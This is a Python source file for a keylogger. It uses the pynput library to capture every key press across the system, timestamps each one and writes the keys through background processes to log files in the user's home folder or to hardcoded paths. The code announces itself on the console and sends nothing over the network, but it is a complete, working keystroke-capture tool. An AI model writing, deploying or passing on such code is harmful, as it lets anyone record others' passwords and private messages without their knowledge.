import string
from datetime import datetime
from pynput import keyboard, mouse
from typing import List, Union
import os
import multiprocessing
import time
import queue
import cprint

# Valid characters for the keylogger
valid_chars = list(string.ascii_lowercase) + list(string.digits)
last_mouse_button_pressed = mouse.Button


class StatusPrint:
    """Utility class for formatted printing of messages with varying severity levels."""
    
    PREFIX_SPACE_N_BEFORE = 5
    PREFIX_SIGN = "\___ "
    PREFIX_SPACE_N_AFTER = 1

    @staticmethod
    def print(text: str, level: int = 0):
        """
        Prints a normal message with a specific indentation level.
        
        Parameters:
        - text (str): The message to print.
        - level (int): The indentation level.
        """
        cprint.cprint(
            f"{' ' * (StatusPrint.PREFIX_SPACE_N_BEFORE * level)}"
            f"{StatusPrint.PREFIX_SIGN * (bool(level))}"
            f"{' ' * (StatusPrint.PREFIX_SPACE_N_AFTER * level)}[NORMAL]: {text}"
        )

    @staticmethod
    def ok(text: str, level: int = 0):
        """
        Prints an OK message with a specific indentation level.
        
        Parameters:
        - text (str): The message to print.
        - level (int): The indentation level.
        """
        text = StatusPrint.add_prefix(f"[OK]: {text}", level)
        cprint.cprint.ok(text)

    @staticmethod
    def info(text: str, level: int = 0):
        """
        Prints an informational message with a specific indentation level.
        
        Parameters:
        - text (str): The message to print.
        - level (int): The indentation level.
        """
        text = StatusPrint.add_prefix(f"[INFO]: {text}", level)
        cprint.cprint.info(text)

    @staticmethod
    def warn(text: str, level: int = 0):
        """
        Prints a warning message with a specific indentation level.
        
        Parameters:
        - text (str): The message to print.
        - level (int): The indentation level.
        """
        text = StatusPrint.add_prefix(f"[WARNING]: {text}", level)
        cprint.cprint.warn(text)

    @staticmethod
    def error(text: str, level: int = 0):
        """
        Prints an error message with a specific indentation level.
        
        Parameters:
        - text (str): The message to print.
        - level (int): The indentation level.
        """
        text = StatusPrint.add_prefix(f"[ERROR]: {text}", level)
        cprint.cprint.err(text)

    @staticmethod
    def fatal(text: str, level: int = 0):
        """
        Prints a fatal error message with a specific indentation level.
        
        Parameters:
        - text (str): The message to print.
        - level (int): The indentation level.
        """
        text = StatusPrint.add_prefix(f"[FATAL]: {text}", level)
        cprint.cprint.fatal(text)

    @staticmethod
    def add_prefix(text: str, level: int = 0) -> str:
        """
        Adds a prefix to a message based on the indentation level.
        
        Parameters:
        - text (str): The message to prefix.
        - level (int): The indentation level.
        
        Returns:
        - str: The prefixed message.
        """
        level = int(level)
        prefix_spaces_before = " " * (StatusPrint.PREFIX_SPACE_N_BEFORE * level)
        prefix_spaces_after = f"{' ' * (StatusPrint.PREFIX_SPACE_N_AFTER * level)}"
        prefix = f"{prefix_spaces_before}{StatusPrint.PREFIX_SIGN * (bool(level))}{prefix_spaces_after}"
        return f"{prefix}{text}"


class FileError(Exception):
    """Base class for exceptions related to file operations."""
    
    def __init__(self, message: str):
        self.message = message
        super().__init__(self.message)


class FileAccessError(FileError):
    """Exception raised for access-related errors."""
    pass  # Inherits everything from FileError


class FileInUseError(FileAccessError):
    """Exception raised when a file is in use by another process."""
    pass  # Inherits everything from FileAccessError


class FilePermissionError(FileError):
    """Exception raised for permission-related errors."""
    pass  # Inherits everything from FileError


class FileNotReadableError(FilePermissionError):
    """Exception raised when a file is not readable."""
    pass  # Inherits everything from FilePermissionError


class FileNotWritableError(FilePermissionError):
    """Exception raised when a file is not writable."""
    pass  # Inherits everything from FilePermissionError


class FileNotExecutableError(FilePermissionError):
    """Exception raised when a file is not executable."""
    pass  # Inherits everything from FilePermissionError


class Log:
    """Class representing a single log entry."""
    
    def __init__(self, text: str, date: datetime = datetime.now()):
        self.text = text
        self.date = str(date)

    def __str__(self):
        return f"[{self.date}]: {self.text}"


class Logger:
    """Logger class for writing log entries to a file."""
    
    DEFAULT_LOG_FORMAT_RULE: str = "[%d]: [%k]"

    def __init__(self, file_path: str, logging_delay: Union[int, float] = 0.1, 
                 overwrite: bool = False, writable: bool = True, readable: bool = False):
        """
        Initializes the Logger instance.

        Parameters:
        - file_path (str): The path of the log file.
        - logging_delay (Union[int, float]): Delay between log outputs (default is 0.1 seconds).
        - overwrite (bool): Whether to overwrite the log file if it exists (default is False).
        - writable (bool): Whether the log file should be writable (default is True).
        - readable (bool): Whether the log file should be readable (default is False).
        """
        self.ok = False
        try:
            self.overwrite = overwrite
            self.writable = writable
            self.readable = readable
            self.validate_log_file_path(file_path)
            self.logging_delay = logging_delay
            self.file_path = file_path
            self.loggers: List[multiprocessing.Process] = []
            self.ok = True
        except (FileExistsError, FileNotWritableError, FileNotReadableError, FileInUseError) as e:
            StatusPrint.error(e, level=1)
            StatusPrint.info("Consider setting overwrite=True when creating the Logger()", level=2)

    def log_generator(self, queue: queue.Queue):
        """Generates logs from the queue."""
        while True:
            log = queue.get()
            yield log

    def log_output(self, queue: queue.Queue):
        """
        Continuously checks the queue for new logs and writes them to the specified file.

        Parameters:
        - queue (queue.Queue): The queue containing logs to output.
        """
        try:
            while True:
                if queue.empty():
                    time.sleep(self.logging_delay)  # Sleep to reduce CPU usage
                else:
                    log_gen = self.log_generator(queue)
                    with open(self.file_path, 'a') as log_file:
                        for log in log_gen:
                            StatusPrint.print(str(log))
                            log_file.write(str(log) + "\n")
        except KeyboardInterrupt:
            StatusPrint.fatal(f"KeyboardInterrupt for {self.file_path} logger")

    def connect(self, queue: queue.Queue):
        """
        Starts a new process for logging output.

        Parameters:
        - queue (queue.Queue): The queue to be processed.
        """
        logger = multiprocessing.Process(target=self.log_output, args=(queue,))
        logger.start()
        self.loggers.append(logger)

    def format_log(self, log: Log, format_rule: str = DEFAULT_LOG_FORMAT_RULE) -> str:
        """
        Formats a log message according to a specified rule.

        Parameters:
        - log (Log): The log object to format.
        - format_rule (str): The format rule to use (default is DEFAULT_LOG_FORMAT_RULE).

        Returns:
        - str: The formatted log string.
        """
        format_rule = format_rule.replace("%d", log.date)
        format_rule = format_rule.replace("%k", log.text)
        return format_rule

    def validate_log_file_path(self, path: str, logging_level: int = 1) -> bool:
        """
        Validates the log file path, ensuring it exists and is accessible.

        Parameters:
        - path (str): The path of the log file.
        - logging_level (int): The logging level for messages (default is 1).

        Returns:
        - bool: True if the file path is valid, otherwise raises an exception.
        """
        StatusPrint.info(f"Validating {path}")
        if os.path.exists(path):
            StatusPrint.warn("File exists", level=logging_level)
            if not self.overwrite:
                raise FileExistsError(f"File already exists, cannot overwrite")
            else:
                StatusPrint.warn(f"Will try to overwrite", level=logging_level)

            if self.writable: 
                if not os.access(path, os.W_OK):
                    raise FileNotWritableError(f"File {path} not writable")
                StatusPrint.ok(f"File writable", level=logging_level)

            if self.readable:
                if not os.access(path, os.R_OK):
                    raise FileNotReadableError(f"File {path} not readable")
                StatusPrint.ok(f"File readable", level=logging_level)
        else:
            StatusPrint.warn(f"File does not exist", level=logging_level)
            directory = os.path.dirname(path)
            if not os.path.exists(directory) and directory:
                os.makedirs(directory)
                StatusPrint.ok("Necessary directories for file path created.", level=logging_level)
            else:
                StatusPrint.ok("Necessary directories for file path already exist", level=logging_level)

        try:
            with open(path, 'w' if self.overwrite else 'a'):
                pass
            StatusPrint.ok(f"File good to go", level=logging_level)
        except IOError as e:
            raise FileInUseError(f"File {path} being used: {e}")

        return True


class KeyLogger:
    """KeyLogger class for capturing and logging keystrokes."""
    
    MAX_KEYS_PER_LINE: int = 20

    def __init__(self, log_file_paths: List[str] = None, overwrite: bool = False, listen_delay_s: Union[int, float] = 0.05):
        """
        Initializes the KeyLogger instance.

        Parameters:
        - log_file_paths (Union[str, List[str]]): Paths for the log files (default is None).
        - overwrite (bool): Whether to overwrite existing log files (default is False).
        - listen_delay_s (Union[int, float]): Delay between keystroke captures (default is 0.05).
        """
        user_name: str = os.getlogin()
        self.key_strokes: queue.Queue = queue.Queue()
        self.overwrite = overwrite
        default_log_folder: str = f"C:/Users/{user_name}/keylogs" if os.name.lower() == "nt" else f"/home/{user_name}/keylogs"
        default_log_file: str = "pykey-logs.txt"
        default_log_file_path: str = f"{default_log_folder}/{default_log_file}"
        StatusPrint.ok(f"[DEFAULT_LOG_PATH]: {default_log_file_path}")
        self.log_file_paths: List[str] = []

        if log_file_paths:
            self.log_file_paths.extend(log_file_paths)
        else:
            self.log_file_paths.append(default_log_file_path)

        StatusPrint.ok(f"[LOG_PATHS]: {self.log_file_paths}")

        self.loggers: List[Logger] = []
        self._log_queue = multiprocessing.Queue()
        self.listen_delay = listen_delay_s

    def log_keystrokes(self):
        """Starts the keyboard listener for logging keystrokes."""
        with keyboard.Listener(on_press=self.on_press) as kb:
            kb.join()

    def on_press(self, key: keyboard.KeyCode):
        """
        Handles the event when a key is pressed.

        Parameters:
        - key (keyboard.KeyCode): The key that was pressed.
        """
        log = Log(
            text=str(key),
            date=datetime.now()
        )
        self._log_queue.put(log)
        time.sleep(self.listen_delay)

    def create_loggers(self):
        """Creates logger instances for each specified log file path."""
        for log_path in self.log_file_paths:
            logger = Logger(
                file_path=log_path,
                overwrite=self.overwrite,
                writable=True,
                logging_delay=1
            )
            if not logger.ok:
                StatusPrint.error("Logger not initialized correctly")
                continue
            logger.connect(self._log_queue)
            self.loggers.append(logger)

    def listen(self, nonblocking: bool = False) -> bool:
        """
        Starts listening for keystrokes.

        Parameters:
        - nonblocking (bool): Specifies whether the logging should run in a non-blocking mode (default is False).

        Returns:
        - bool: True if the operation is successful.
        """
        self.nonblocking = nonblocking
        self.create_loggers()

        StatusPrint.info("Starting keyboard listener")
        if not nonblocking:
            with keyboard.Listener(on_press=self.on_press) as kb:
                kb.join()  # Wait for the listener to finish
            return True

        # Start the keystroke logging process in a separate process
        self.listener = multiprocessing.Process(target=self.log_keystrokes)
        self.listener.start()  # Begin logging keystrokes

        return True


if __name__ == '__main__':
    keylogger = KeyLogger(
        log_file_paths=[
            "/home/bbop/keylog/log-1.txt",
            "/home/bbop/log.txt",
        ],
        overwrite=True,
        listen_delay_s=0.1
    )
    keylogger.listen()
